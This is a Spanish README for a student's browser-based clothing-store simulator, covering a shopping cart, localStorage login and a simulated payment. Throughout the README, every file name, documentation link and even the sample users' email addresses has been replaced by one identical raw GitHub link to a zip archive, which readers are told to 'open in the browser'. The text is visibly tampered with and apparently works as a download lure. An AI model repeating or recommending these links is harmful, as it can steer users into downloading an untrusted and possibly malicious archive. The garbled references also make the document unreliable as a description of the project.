# Simulador de Tienda de Ropa Online
Este es un simulador de tienda de ropa online desarrollado con HTML, CSS y JavaScript. Permite a los usuarios navegar por una selección de productos, agregarlos a un carrito de compras, simular el proceso de pago y gestionar sesiones de usuario con registro e inicio de sesión.

# Funcionalidades Principales
* Visualización de Productos: Los productos se cargan dinámicamente desde un archivo JSON (`https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip`) utilizando `fetch` y se muestran en la página principal. Se incluye manejo básico de errores en la carga del JSON.
* Carrito de Compras Dinámico: Una barra lateral muestra los productos agregados al carrito, adaptándose a diferentes tamaños de pantalla y permitiendo el scroll si hay muchos elementos. Incluye nombre, precio y cantidad de cada producto. El carrito se reinicia (se vacía) cada vez que se refresca la página.
* Agregar al Carrito: Los usuarios pueden agregar productos al carrito haciendo clic en el botón "Agregar". Una notificación animada y de tamaño reducido aparece en la parte superior central confirmando la acción.
* Eliminar del Carrito: Los usuarios pueden reducir la cantidad de un producto o eliminarlo por completo del carrito haciendo clic en el botón "-" junto al producto en la barra lateral. Una notificación animada y de tamaño reducido aparece en la parte superior central confirmando la acción.
* Actualización del Total: El total del carrito se actualiza automáticamente al agregar o eliminar productos.
* Vaciar Carrito: Un botón permite vaciar completamente el carrito de compras con una confirmación mediante SweetAlert2.
* Autenticación de Usuarios:
    -> Registro:** Los nuevos usuarios pueden crear una cuenta ingresando un usuario, contraseña y correo electrónico. Se realizan validaciones básicas para asegurar que todos los campos estén llenos y el formato del correo electrónico sea válido. Los datos se almacenan localmente en el `localStorage` del navegador (simulación).
    -> Inicio de Sesión:** Los usuarios registrados pueden iniciar sesión con su usuario y contraseña. Se verifica que los campos no estén vacíos.
    -> Requerimiento al Cargar:** Al abrir la página, se muestra un modal de autenticación, obligando al usuario a iniciar sesión o registrarse para continuar.
    -> Persistencia de Sesión:** La sesión del usuario persiste durante la sesión del navegador. Al navegar por la página, el usuario permanece logueado hasta que cierra la pestaña o limpia el almacenamiento del navegador.
* Proceso de Pago:
    -> Requerimiento de Autenticación: Al hacer clic en "Finalizar Compra", si el usuario no ha iniciado sesión, se mostrará el modal de autenticación. Si ya ha iniciado sesión, se mostrará el formulario de "Detalles de Pago".
    -> Detalles de Pago: Se muestra un modal con un formulario para ingresar nombre, número de tarjeta y fecha de vencimiento de la tarjeta. Se realizan validaciones básicas para asegurar que todos los campos estén llenos y que el número de tarjeta sea un número.
    -> Simulación de Pago Mejorada: Al enviar el formulario de pago, se simula un procesamiento con una espera visual y la posibilidad de que el pago sea exitoso o fallido (con una probabilidad del 80% de éxito). Se muestra un mensaje de éxito o error con SweetAlert2.
* Cerrar Sesión: Un botón "Cerrar Sesión" aparece en la esquina superior izquierda cuando un usuario ha iniciado sesión. Al hacer clic, se cierra la sesión y se vuelve a mostrar el modal de autenticación.

# Tecnologías Utilizadas

* HTML: Estructura y contenido de la página web.
* CSS: Estilos visuales y diseño de la interfaz de usuario.
* JavaScript: Lógica interactiva, manipulación del DOM, gestión del carrito y autenticación.
* Fetch API: Se utiliza para cargar de forma asíncrona los datos de los productos desde el archivo `https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip`. Se incluye manejo básico de errores en la carga.
* SweetAlert2 (Librería Externa - Versión 11): Librería para mostrar alertas y notificaciones atractivas. Documentación: [https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip](https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip)

# Cómo Utilizar

1.  Abrir el archivo `https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip` en tu navegador web.

2.  Navegar por los productos: Explora la lista de ropa disponible en la página principal.

3.  Agregar al carrito: Haz clic en el botón "Agregar" de cualquier producto para añadirlo a tu carrito de compras. El carrito se mostrará en la barra lateral derecha.

4.  Gestionar el carrito:
    -> Visualiza los artículos en el carrito y el total.
    -> Utiliza el botón "-" junto a cada artículo para eliminar una unidad.
    -> Haz clic en "Vaciar Carrito" para eliminar todos los artículos.

5.  Finalizar compra: Haz clic en "Finalizar Compra". Si no has iniciado sesión, se mostrará el modal de autenticación.

6.  *Autenticación: **RECOMENDACION REGISTRO DE USUARIO: (usuario: usuario1, constraseña: 1234, Mail: https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip)**
    -> Registrarse: Si eres un nuevo usuario, haz clic en "¿No tienes cuenta? Regístrate" y completa el formulario.
    -> Iniciar sesión: Si ya tienes una cuenta, ingresa tu usuario y contraseña en el formulario de inicio de sesión.

7.  Pago: Después de iniciar sesión y hacer clic en "Finalizar Compra", se mostrará un modal con un formulario de pago simulado. Ingresa los detalles y haz clic en "Pagar". Se mostrará un mensaje de éxito o fallo aleatorio.

8.  Cerrar Sesión: Si has iniciado sesión, aparecerá un botón "Cerrar Sesión" en la esquina superior izquierda. Haz clic en él para cerrar tu sesión y volver a la pantalla de autenticación.

# Notas Adicionales
* Los datos de los productos se cargan desde el archivo `https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip`. Puedes modificar este archivo para agregar, eliminar o editar productos.
* La información de los usuarios registrados se almacena localmente en el navegador (`localStorage`).
* La simulación de pago es completamente del lado del cliente y no involucra transacciones reales.
* El estado de la sesión del usuario se mantiene utilizando `localStorage`.
* Se puede crear diferentes usuarios e iniciar sesion con cada uno 
    EJ: usuario: usuario1, constraseña: 1234, Mail: https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip 
        usuario: usuario2, constraseña: 1234, Mail: https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip 
        usuario: usuario3, constraseña: 1234, Mail: https://raw.githubusercontent.com/JallinskyLuca/EntregaFinal/main/img/EntregaFinal_2.2.zip 
Vamos a poder iniciar sesion con cada uno de estos si los hemos creado.
* Recomiendo que vea desde herramientas de desarrollador como funciona todo, mas que nada la parte del localStorage.
Espero su devolucion Profesor, cualquier cosa del codigo que no se entienda se la puedo explicar, o al menos decirle que quise hacer.
Desde ya muchas gracias por tomarse el tiempo para ver mi proyecto.


¡Gracias por probar el simulador de tienda de ropa!
